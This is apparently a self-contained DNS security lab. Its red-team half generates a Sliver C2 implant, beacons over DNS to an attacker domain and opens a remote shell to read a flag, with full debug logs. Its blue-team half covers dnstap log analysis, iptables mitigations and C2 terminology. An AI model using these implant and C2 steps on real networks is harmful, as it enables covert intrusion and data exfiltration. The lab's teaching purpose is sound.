# DNS Security Lab

In this lab, we are going to subvert DNS communication to infiltrate/exfiltrate a network.

Sliver C2 will be used as it is intended to show how a adversary can use C2 frameworks to control their botnet. For "personal" replication of this infrastructure, it is advised to use [iodine](https://github.com/yarrick/iodine) which will not have the sulfurous conotation of sliver.



# Red Team

## Generation of the payload

Connect to the C2 Server shell and execute Sliver client:

```
❯ make c2_server_shell
#
# sliver
Connecting to localhost:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain first strike
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```



### DNS Listeners

Make sure you have a DNS listener running, and to use the FQDN again. Sliver will not be able to correctly parse C2 traffic if the parent  domain is misconfigured:

```
sliver > dns --domains s.commandcontrol.com   --lport 53 -D -c

[*] Starting DNS listener with parent domain(s) [s.commandcontrol.com.] ...

[*] Successfully started job #1
```

(-D -c are for resolving an [issue](https://github.com/BishopFox/sliver/issues/1714#issuecomment-2437165100) linked to latest Sliver release)		

### Generate implant

```
sliver > generate --dns s.commandcontrol.com --os linux --save /shared-data --debug --reconnect 1

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 24s
[*] Implant saved to /root/sliver/TENDER_HOSPITAL
```



**Sliver** can generates a **malicious binary** that can be executed on a Linux machine. Once this payload is executed on the target system, it tries to establish a **covert communication channel** back to the attacker’s server, here using DNS queries. These DNS queries are sent to the domain which the attacker controls (here s.commandcontrol.com-. The attacker can use this communication channel to issue commands to the infected machine or extract sensitive information.

We use the debug flag to see what is happening on our victim  machine, as being stealthy on the execution is not the primary goal of this lab and for understanding the implant behavior, having the debug information is useful.   	



## Transfer of the payload

We could transfer the payload by DNS but DNS covert channels can be slow and for the sake of time efficiency we will do a direct transfer.

You can come back to this section and implement DNSStager once you have finished the remaining points.



## Running of the payload

The previous command will have generated the payload under the shared-data folder.

You have to run this executable from the client shell. Replace the TENDER_HOSPITAL with your payload name.

```
❯ make client_shell
/ # /shared-data/TENDER_HOSPITAL
2024/11/23 15:48:23 sliver.go:95: Hello my name is TENDER_HOSPITAL
2024/11/23 15:48:23 limits.go:58: Limit checks completed
2024/11/23 15:48:23 sliver.go:113: Running in session mode
2024/11/23 15:48:23 session.go:64: Starting interactive session connection loop ...
2024/11/23 15:48:23 transports.go:41: Starting c2 url generator () ...
2024/11/23 15:48:23 transports.go:104: Return generator: (chan *url.URL)(0xc00007c6c0)
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
2024/11/23 15:48:23 session.go:171: Attempting to connect via DNS via parent: s.commandcontrol.com
2024/11/23 15:48:23 dnsclient.go:150: DNS client connecting to 's.commandcontrol.com' (timeout: 5s) ...
2024/11/23 15:48:23 dnsclient.go:295: [dns] found resolvers: [10.89.1.3]
2024/11/23 15:48:23 crypto.go:199: TOTP Code: 52809890
2024/11/23 15:48:23 dnsclient.go:713: [dns] Fetching dns session id via 'baakb4nb9w68.s.commandcontrol.com.' ...
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of baakb4nb9w68.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.042231ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 1.162.116.21
2024/11/23 15:48:23 dnsclient.go:734: [dns] dns session id: 7643649
2024/11/23 15:48:23 dnsclient.go:810: [dns] Fingerprinting 1 resolver(s) ...
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3423e1f1fbyvwzpu.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.180792ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 92.10.10.78
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c342ecvtvmqu41y67.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 9.623392ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 153.190.31.97
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3427qqre76jzxjyg.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.844706ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 25.33.165.86
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3426n8gqbd5er33g.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.286681ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 17.107.58.163
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPNPEZfokxzwH.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.259932ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 208.211.228.44
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPSJri3BywNN5.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.637425ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 19.118.128.142
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPbsjY7F2GKS3.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.579596ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 239.28.240.5
2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPd6Zv4zcUidp.s.commandcontrol.com. ?
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.515403ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 152.37.160.128
2024/11/23 15:48:23 dnsclient.go:830: [dns] 10.89.1.3:53: avg rtt 3.74099ms, base58: true, errors 0
2024/11/23 15:48:23 dnsclient.go:649: [dns] encoded: 0, subdata space: 227 | stop: 103, len: 104
2024/11/23 15:48:23 dnsclient.go:655: [dns] shave data [0:104] of 104
2024/11/23 15:48:23 dnsclient.go:661: [dns] encoded length is 157 (max: 228)
2024/11/23 15:48:23 dnsclient.go:690: [dns] subdata 0 (0->104): 104 bytes
2024/11/23 15:48:23 dnsclient.go:693: [dns] original data: 104 bytes
2024/11/23 15:48:23 dnsclient.go:694: [dns] total subdata: 104 bytes
2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.390112ms (err: <nil>)
2024/11/23 15:48:23 resolver-generic.go:152: [dns] answer (txt): [pdrzTB7BJ5lUz4TEjJItw4Zc3LNNzPll6whAc0BojCcPpQsDS9ZGuiT8d6PE0CKTCl3enPt-DllzUfGM]
2024/11/23 15:48:23 dnsclient.go:355: [dns] key exchange was successful!
2024/11/23 15:48:23 dnsclient.go:359: [dns] starting worker(s) ...
2024/11/23 15:48:23 session.go:179: Starting new session with id = &{[0xc0000a62d0] 0xc0000a0240 map[10.89.1.3:53:0xc0000ae200] .s.commandcontrol.com. 1000000000 3 5000000000 false  228 7643649 1 false 0xc0001ba390 0xc000070600 0xc000070660 [0xc00006eba0 0xc00006ebc0] 2 {} {} true}
2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
```



## Execution from the C2

Now that the client implant is running, you should see the following message appearing indicating a new session is presnet.

Activate it with use *** (use autocomplete based on the previous log.)

Use the shell command to launch a shell from the client point of view.

Use the cat command to show the flag.txt file.

```
[*] Session 6126a4aa TENDER_HOSPITAL - n/a (79152dff528d) - linux/amd64 - Sat, 23 Nov 2024 15:52:13 UTC

sliver > use 6126a4aa-6907-4de9-88c8-99824c8cccca

[*] Active session TENDER_HOSPITAL (6126a4aa-6907-4de9-88c8-99824c8cccca)

sliver (TENDER_HOSPITAL) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 31

79152dff528d:/# cat /flag.txt
?
```

Once done, you can stop the implant on the client (with CTRL+C):

```
2024/11/24 13:43:00 dnsclient.go:250: [dns] #0 work: &{1 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com. 0xc0000991b0 <nil>}
2024/11/24 13:43:00 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 1WTEgnsvX2ADPtSoWeejgvgkVBCajX96TPcCsUaNTcisn8L7amj9LouY5sukVPG.hqxhttU8xuRLTx9kWkEHXpvnqcnqsPKaEQ2SKzAREcTcdnFNqB5UK6Jz27BY5Vb.rTGUMiUrSnwzcBJcw7JHeppBU5e.s.commandcontrol.com. ?
2024/11/24 13:43:00 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 4.471954ms (err: <nil>)
2024/11/24 13:43:00 resolver-generic.go:109: [dns] answer (a): 211.51.2.208
2024/11/24 13:43:00 dnsclient.go:428: [dns] read envelope ...
2024/11/24 13:43:00 dnsclient.go:441: [dns] poll msg domain: 6Ngv85FEMSXAyihNWDN5VbD.s.commandcontrol.com.
^C
```



### Firewal check

Consult the firewall log output to confirm that only the DNS rule has indeed been matched:

```
❯ make firewall_shell
/ # iptables -vL
Chain INPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "INPUT DROP: "

Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
 1044  159K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
 1040  149K ACCEPT     udp  --  any    any     anywhere             anywhere             udp dpt:domain
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:domain
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "FORWARD DROP: "

Chain OUTPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 LOG        all  --  any    any     anywhere             anywhere             LOG level warn prefix "OUTPUT DROP: "
```



# Blue team

## Log Analysis

As this lab aims to be "self contained", we have generated DNS zones present on the DNS public (taken from Cloudflare top 10000 DNS on Cloudflare Radar). The client is doing DNS resolution since the beginning of this lab in parallel of the Sliver client. We are going to analyze them.

Connect on the dns internal and convert the binary  dnstap log in protobuf in a readeable YAML file with:

```
❯ make dns_internal_shell
/ # dnstap-read -y /var/log/log.dnstap  > /var/log/dnslog.txt
```

You have now a readeable log:

```
❯ tail -n 42 dns_internal/var/log/dnslog.txt
type: MESSAGE
identity: 8465940cfe2f
version: BIND 9.20.3
message:
  type: CLIENT_RESPONSE
  response_time: !!timestamp 2024-11-24T13:46:27Z
  message_size: 46b
  socket_family: INET
  socket_protocol: UDP
  query_address: "10.89.1.4"
  response_address: "10.89.1.3"
  query_port: 45801
  response_port: 53
  response_message_data:
    opcode: QUERY
    status: NOERROR
    id: 8387
    flags: qr rd ra
    QUESTION: 1
    ANSWER: 1
    AUTHORITY: 0
    ADDITIONAL: 0
    QUESTION_SECTION:
      - 'brwsrfrm.com. IN A'
    ANSWER_SECTION:
      - 'brwsrfrm.com. 86400 IN A 108.121.79.28'
  response_message: |
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id:   8387
    ;; flags: qr rd ra    ; QUESTION: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
    ;; QUESTION SECTION:
    ;brwsrfrm.com.			IN	A

    ;; ANSWER SECTION:
    brwsrfrm.com.		86400	IN	A	108.121.79.28

```







## RPZ 



## IPtables rules 

You can use iptables to help detect and block DNS tunneling by monitoring and limiting DNS traffic patterns commonly associated with tunneling. While iptables alone won’t detect the high-entropy or encoded data directly, it can restrict traffic patterns typical of DNS tunneling.



Here are some ways to configure iptables to help mitigate DNS tunneling:



**1. Limit the Rate of DNS Queries**



DNS tunneling often involves a high frequency of DNS requests. You can use iptables to rate-limit DNS requests per IP, which can reduce the effectiveness of tunneling attempts.



\# Rate limit incoming DNS queries to 10 per second per source IP

iptables -A INPUT -p udp --dport 53 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT

iptables -A INPUT -p udp --dport 53 -j DROP



\# Optionally, apply the same rate limit for TCP DNS queries (some tunnels may use TCP)

iptables -A INPUT -p tcp --dport 53 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT

iptables -A INPUT -p tcp --dport 53 -j DROP



In this example:



​	•	--limit 10/sec allows up to 10 DNS requests per second per IP.

​	•	--limit-burst 20 allows a burst of up to 20 requests before applying the rate limit.

​	•	Excess requests are dropped, potentially interrupting DNS tunneling attempts.



**2. Block Large DNS Packets**



DNS tunneling can involve large DNS packets, especially if the payload is being transferred via TXT records. You can use iptables to drop DNS packets above a certain size threshold.



\# Drop UDP DNS packets larger than 512 bytes

iptables -A INPUT -p udp --dport 53 -m length --length 512:65535 -j DROP



\# Drop TCP DNS packets larger than 512 bytes (optional, for TCP DNS tunnels)

iptables -A INPUT -p tcp --dport 53 -m length --length 512:65535 -j DROP



This rule drops any DNS packets larger than 512 bytes, which are unusual for typical DNS traffic but common for DNS tunneling payloads. You can adjust the threshold depending on your traffic patterns.



**3. Limit Specific DNS Query Types (e.g., TXT)**



DNS tunneling frequently uses TXT records to transfer data. You can use iptables to block or limit the rate of TXT record queries.



This requires using an IDS/IPS solution (like Snort or Suricata) or iptables with custom u32 matches to inspect DNS query types. However, here’s a more general approach using the string match to drop or limit requests containing specific keywords, such as “TXT”:



\# Drop DNS queries with "TXT" in the payload (requires iptables-modules installed)

iptables -A INPUT -p udp --dport 53 -m string --algo bm --string "TXT" -j DROP



This approach isn’t foolproof and may generate false positives, as legitimate TXT queries would also be dropped.



**4. Restrict Outbound DNS Traffic**



If your environment allows it, you can restrict DNS queries to only trusted DNS servers, preventing clients from querying arbitrary external DNS servers, which can be used for tunneling.



\# Allow DNS queries only to trusted DNS servers (e.g., 8.8.8.8 and 8.8.4.4)

iptables -A OUTPUT -p udp --dport 53 -d 8.8.8.8 -j ACCEPT

iptables -A OUTPUT -p udp --dport 53 -d 8.8.4.4 -j ACCEPT



\# Drop all other outbound DNS requests

iptables -A OUTPUT -p udp --dport 53 -j DROP



This setup forces all DNS traffic to use only the specified DNS servers, reducing the likelihood of DNS tunneling via unapproved servers.



**5. Monitor and Alert on Suspicious DNS Traffic Patterns**



Using iptables logging, you can set up rules to log unusual DNS activity, such as high query rates or large DNS packets. This helps in identifying possible tunneling activity, which you can later block based on patterns observed.



\# Log DNS queries exceeding a rate limit (for monitoring)

iptables -A INPUT -p udp --dport 53 -m limit --limit 10/min --limit-burst 5 -j LOG --log-prefix "DNS-HighRate: "



\# Log large DNS packets (for monitoring)

iptables -A INPUT -p udp --dport 53 -m length --length 512:65535 -j LOG --log-prefix "DNS-LargePacket: "



​	•	**High Rate Logging**: Logs DNS queries that exceed a specified rate, helping to identify sources of frequent DNS queries.

​	•	**Large Packet Logging**: Logs DNS packets above a certain size, which could indicate tunneled data.



**6. Block Non-Standard Ports for DNS**



Ensure DNS queries are only allowed on standard ports (UDP/53 and TCP/53). Some tunneling techniques may attempt to use non-standard ports to evade detection.



\# Drop DNS traffic on non-standard ports

iptables -A INPUT -p udp ! --dport 53 -j DROP

iptables -A INPUT -p tcp ! --dport 53 -j DROP



This rule drops all DNS-like traffic that doesn’t use the standard DNS ports, making it harder to use alternative ports for tunneling.



**Summary of iptables Techniques**



​	1.	**Rate Limit** DNS requests per IP to limit the frequency of queries.

​	2.	**Drop Large Packets** over a certain size threshold to prevent excessive data transfer via DNS.

​	3.	**Limit Specific Query Types** like TXT to reduce the likelihood of data transfers via these records.

​	4.	**Restrict DNS to Trusted Servers** to prevent clients from querying unknown external servers.

​	5.	**Log Suspicious Patterns** to monitor for DNS tunneling and fine-tune rules.

​	6.	**Enforce Standard DNS Ports** to block DNS-like traffic on non-standard ports.



Combining these iptables rules can help mitigate DNS tunneling attempts, especially when paired with proper logging and monitoring for visibility into potentially suspicious DNS activity.



# Some C2 Basics

There is some common language used when it comes to operating or using a C2  framework, regardless of which one you choose here's a quick rundown on  some terms you might come across.

**Implant** — This is a very generic term used to describe the piece of software  that helps maintain access to a target system, it’s pretty much acts  like an agent.

**Beacon** — Can be interpreted as a pattern of communication between a target  system and our C2 server, a target endpoint will periodically reach out  to the C2 server to “check-in” and process any tasks issued from the  server, the beaconing interval is normally randomised for  evasion/stealth purposes.

**Jitter** — Normally refers to the random delay (sometimes in seconds or minutes) between beaconing intervals, pretty much just the random delay between  the implant/agent reaching out to the C2 server.

**Staged Payload** — Of course the term payload refers to a piece of code we want to  execute on a target system, the staged part of this term refers to a  small piece of code that will later load a bigger piece of code (the  payload).

If you have a large payload to execute on a target system it could set off alarm bells at a network or system level, or it might just be really  complex or use a lot of bandwidth to execute outright, so staging this  payload essentially breaks it up into different “stages” e.g. Stage0  loads => Stage1 loads => Stage2 etc.

**BOF** — Stands for Beacon Object File, is generally custom code that can be  written by a C2 operator that can interact and use the C2 beacon API’s,  it allows for the ability of adding custom functionality and extending  the capabilities of whichever C2 you choose to use if it allows custom  BOF’s.

**Communications** — When it comes to C2 servers, communication between the implant and  server is of course vital but what’s also just as important is their  methods of communication, it needs to be reliable and covert, you’ll see a number of C2 servers communicate over DNS, HTTPS, mTLS and in some  cases even more obscure protocols.

In some cases a C2 framework can even use third-party services like Discord, Slack or even Twitter as methods of communication.